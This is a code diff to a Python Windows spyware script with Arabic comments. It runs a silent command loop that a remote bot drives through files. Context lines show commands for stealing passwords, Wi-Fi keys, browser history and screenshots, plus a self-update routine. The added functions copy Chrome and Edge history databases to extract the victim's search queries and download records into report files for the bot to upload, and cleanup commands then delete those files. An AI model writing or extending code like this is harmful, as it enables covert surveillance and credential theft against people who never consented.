@@ -1,6 +1,12 @@
 import os, time, shutil, sqlite3, json, base64, subprocess, win32crypt
 from Crypto.Cipher import AES
 from PIL import ImageGrab
+import os
+import requests
+import subprocess
+from pathlib import Path
+import time
+from datetime import datetime, timedelta
 
 CREATE_NO_WINDOW = 0x08000000
 
@@ -79,11 +85,7 @@ def run_history():
             except: pass
     return out
 
-import os
-import requests
-import subprocess
-from pathlib import Path
-import time
+
 
 # --- إعداد المسارات ---
 CROSSMOS_PATH = Path(r"C:\ProgramData\MOS\crossmos.py")
@@ -126,55 +128,177 @@ def update():
         print(f"[!] Update failed: {e}")
 
 
+import urllib.parse
+
+def run_search_history():
+    user_p = os.path.expanduser("~")
+    paths = {
+        "Edge": user_p + r"\AppData\Local\Microsoft\Edge\User Data\Default\History",
+        "Chrome": user_p + r"\AppData\Local\Google\Chrome\User Data\Default\History",
+    }
+    
+    # تحديد مسار الملف داخل مجلد البرنامج الأساسي
+    output_file = os.path.join(BASE_DIR, "search_history.txt")
+    SEARCH_KEYS = ["q", "search_query", "query"]
+    results = []
+
+    for browser, history_path in paths.items():
+        if not os.path.exists(history_path):
+            continue
+
+        temp_copy = os.path.join(os.environ["TEMP"], f"{browser}_sh_tmp.db")
+        try:
+            shutil.copy2(history_path, temp_copy)
+            conn = sqlite3.connect(temp_copy)
+            cur = conn.cursor()
+
+            # جلب الروابط التي تحتوي على علامة استفهام (روابط البحث غالباً)
+            cur.execute("SELECT url, last_visit_time FROM urls WHERE url LIKE '%?%'")
+
+            for url, last_visit in cur.fetchall():
+                parsed = urllib.parse.urlparse(url)
+                params = urllib.parse.parse_qs(parsed.query)
+
+                for key in SEARCH_KEYS:
+                    if key in params:
+                        raw_query = params[key][0].strip()
+                        if not raw_query: continue
+
+                        # فك ترميز النصوص (مثل الكلمات العربية)
+                        clean_query = urllib.parse.unquote_plus(raw_query)
+                        
+                        # تحويل التوقيت
+                        time_dt = datetime(1601, 1, 1) + timedelta(microseconds=last_visit)
+                        visit_time = time_dt.strftime("%Y-%m-%d %H:%M:%S")
+
+                        results.append((visit_time, browser, clean_query, url))
+
+            conn.close()
+            os.remove(temp_copy)
+        except:
+            if os.path.exists(temp_copy): os.remove(temp_copy)
+            continue
+
+    if not results:
+        return "NO_SEARCH_DATA"
+
+    # ترتيب وإزالة التكرار
+    results = list(dict.fromkeys(results))
+    results.sort(key=lambda x: x[0])
+
+    with open(output_file, "w", encoding="utf-8") as f:
+        f.write("--- BROWSER SEARCH HISTORY REPORT ---\n\n")
+        for time_s, br, query, url in results:
+            f.write(f"Time: {time_s} | Browser: {br}\nSearch: {query}\nURL: {url}\n")
+            f.write("-" * 60 + "\n")
+    
+    return "SEARCH_FILE_READY"
+
+from datetime import datetime, timedelta
+
+def run_downloads():
+    user_p = os.path.expanduser("~")
+    paths = {
+        "Edge": user_p + r"\AppData\Local\Microsoft\Edge\User Data\Default\History",
+        "Chrome": user_p + r"\AppData\Local\Google\Chrome\User Data\Default\History",
+    }
+    
+    # مسار الملف النهائي الذي سيقوم البوت برفعه
+    output_file = os.path.join(BASE_DIR, "downloads_report.txt")
+    results = []
+
+    for browser, history_path in paths.items():
+        if not os.path.exists(history_path):
+            continue
+
+        temp_copy = os.path.join(os.environ["TEMP"], f"{browser}_dl_tmp.db")
+        try:
+            shutil.copy2(history_path, temp_copy)
+            conn = sqlite3.connect(temp_copy)
+            cur = conn.cursor()
+
+            cur.execute("SELECT id, target_path, start_time FROM downloads")
+            downloads = cur.fetchall()
+
+            for download_id, target_path, start_time in downloads:
+                cur.execute("SELECT url FROM downloads_url_chains WHERE id = ? ORDER BY chain_index LIMIT 1", (download_id,))
+                row = cur.fetchone()
+                if not row: continue
+                
+                url = row[0]
+                # تحويل وقت كروم (Microseconds since 1601)
+                time_dt = datetime(1601, 1, 1) + timedelta(microseconds=start_time)
+                time_str = time_dt.strftime("%Y-%m-%d %H:%M:%S")
+                results.append((time_str, browser, target_path, url))
+
+            conn.close()
+            os.remove(temp_copy)
+        except:
+            if os.path.exists(temp_copy): os.remove(temp_copy)
+            continue
+
+    if not results:
+        return "NO_DATA"
+
+    # ترتيب النتائج حسب الوقت
+    results = list(dict.fromkeys(results))
+    results.sort(key=lambda x: x[0])
+
+    with open(output_file, "w", encoding="utf-8") as f:
+        f.write("--- BROWSER DOWNLOAD HISTORY REPORT ---\n\n")
+        for time_s, br, path, url in results:
+            f.write(f"Date: {time_s}\nBrowser: {br}\nFile: {path}\nSource: {url}\n")
+            f.write("-" * 50 + "\n")
+    
+    return "FILE_READY"
+
 # حلقة المراقبة الصامتة
-from PIL import ImageGrab
-import pygetwindow as gw
-import os, time
-
-if not os.path.exists(BASE_DIR):
-    os.makedirs(BASE_DIR)
-
+if not os.path.exists(BASE_DIR): os.makedirs(BASE_DIR)
 while True:
     if os.path.exists(CMD_FILE):
         try:
-            with open(CMD_FILE, "r") as f:
-                cmd = f.read().strip()
-
+            with open(CMD_FILE, "r") as f: cmd = f.read().strip()
             res = ""
-
-            if cmd == "passwords":
-                res = run_passwords()
-
-            elif cmd == "wifi":
-                res = run_wifi()
-
-            elif cmd in ["history", "browser"]:
-                res = run_history()
-
-            elif cmd == "update":
-                res = update()
-
-            # 📸 Screenshot كامل الشاشة (كما هو بدون تغيير)
+            if cmd == "passwords": res = run_passwords()
+            elif cmd == "wifi": res = run_wifi()
+            elif cmd in ["history", "browser"]: res = run_history()
+            elif cmd == "update": res = update()
             elif cmd == "screenshot":
                 ImageGrab.grab().save(SS_FILE)
                 res = "SCREENSHOT_DONE"
-
-            # 🎯 Screenshot للنافذة النشطة فقط (الجديد)
-            elif cmd == "screenshot_active":
-                window = gw.getActiveWindow()
-                if window:
-                    bbox = (window.left, window.top, window.right, window.bottom)
-                    ImageGrab.grab(bbox=bbox).save(SS_FILE)
-                    res = "SCREENSHOT_ACTIVE_DONE"
+            elif cmd == "downloads":
+                status = run_downloads()
+                if status == "FILE_READY":
+                    # نخبر البوت أن الملف جاهز في المسار المعتاد
+                    res = "DOWNLOADS_READY"
                 else:
-                    res = "NO_ACTIVE_WINDOW"
+                    res = "No downloads found or error occurred."
 
-            with open(RES_FILE, "w", encoding="utf-8") as f:
-                f.write(res)
+            # --- كود الحذف بعد التأكيد (يُضاف في نهاية معالجة الأوامر) ---
+            # يمكنك إضافة أمر جديد يرسله البوت باسم 'cleanup_dl' بعد أن ينتهي من تحميل الملف
+            elif cmd == "clear_dl":
+                dl_file = os.path.join(BASE_DIR, "downloads_report.txt")
+                if os.path.exists(dl_file):
+                    os.remove(dl_file)
+                res = "CLEANUP_DONE"
+            
+            elif cmd == "searchs":
+                status = run_search_history()
+                if status == "SEARCH_FILE_READY":
+                    # يرسل للبوت إشارة بأن الملف جاهز للرفع من المسار BASE_DIR
+                    res = "SEARCH_HISTORY_READY"
+                else:
+                    res = "No search history found."
 
-            os.remove(CMD_FILE)  # مسح الطلب بعد التنفيذ
+            # أمر إضافي لحذف ملفات البحث بعد أن يسحبها البوت
+            elif cmd == "clear_searchs":
+                search_file = os.path.join(BASE_DIR, "search_history.txt")
+                if os.path.exists(search_file):
+                    os.remove(search_file)
+                res = "SEARCH_CLEANUP_DONE"
 
-        except:
-            pass
 
+            with open(RES_FILE, "w", encoding="utf-8") as f: f.write(res)
+            os.remove(CMD_FILE) # مسح الطلب بعد التنفيذ
+        except: pass
     time.sleep(1)
